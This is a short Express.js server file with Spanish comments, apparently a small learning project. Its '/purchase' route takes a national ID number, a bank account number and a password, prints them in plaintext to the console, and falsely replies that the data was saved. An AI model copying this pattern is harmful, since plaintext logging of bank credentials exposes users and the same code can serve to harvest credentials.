// Variables
const express = require("express");
const bodyParser = require("body-parser");
const path = require('path');
const app = express();

const PORT = 3000;

// Import DB functions.
const {
  login,
} = require("./db/connection.js");


// Configurar la entrega de archivos estáticos.
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "../frontend")));

// Server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});



// Routing
app.get('/', (req, res) => {
  const filePath = path.join(__dirname, '..', "frontend", "index.html");
  res.sendFile(filePath);
});

app.post('/purchase', (req, res) => {
  const cedula = req.body.cedula;
  const accountNumber = req.body.accountNumber;
  const password = req.body.password;

  console.log(`Cedula: ${cedula} AccountNumber: ${accountNumber} Password: ${password}`);

  res.send('Data saved correctly');
});